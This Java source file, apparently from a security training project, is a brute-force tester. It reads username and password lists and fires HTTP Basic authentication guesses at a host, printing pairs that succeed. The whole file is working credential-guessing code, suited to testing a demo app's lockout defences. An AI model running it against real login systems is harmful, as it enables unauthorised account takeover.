/*
 * Copyright 2015-2018 Josh Cummings
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.joshcummings.codeplay.tools;

import com.joshcummings.codeplay.terracotta.testng.HttpSupport;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.RequestBuilder;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BruteForceTester {
	static HttpSupport http = new HttpSupport();
	static Base64.Encoder encoder = Base64.getEncoder();

	static long start = System.currentTimeMillis();
	static int count = 0;

	private static class Result {
		String username;
		String password;
		int status;

		public Result(String username, String password, int status) {
			this.username = username;
			this.password = password;
			this.status = status;
		}

		public void print() {
			String message = String.format("%s:%s -> %d",
					this.username, this.password, this.status);
			if ( this.status == 200 ) {
				System.err.println(message);
			}
		}
	}

	private static Result login(String username, String password) {
		String up = encoder.encodeToString((username + ":" + password).getBytes());

		try (CloseableHttpResponse response =
				http.getForEntity(RequestBuilder.get("/")
					.addHeader("Authorization", "Basic " + up)) ){

			int status = response.getStatusLine().getStatusCode();

			return new Result(username, password, status);
		} catch ( Exception e ) {
			e.printStackTrace();
			return new Result(username, password, -1);
		}
	}

	private static void results(Result result) {
		result.print();

		count++;
		if ( System.currentTimeMillis() - start > 60000 ) {
			System.out.printf("%d guesses in the last minute%n", count);
			count = 0;
			start = System.currentTimeMillis();
		}
	}

	public static void main(String[] args) throws IOException {
		try (BufferedReader passwords =
					 new BufferedReader(new FileReader(args[1]))) {

			List<String> usernames = Files.readAllLines(Paths.get(args[0]));
			for ( String username : usernames ) {
				passwords.lines()
					.map(password -> login(username, password))
					.forEach(BruteForceTester::results);
			}
		}
	}
}
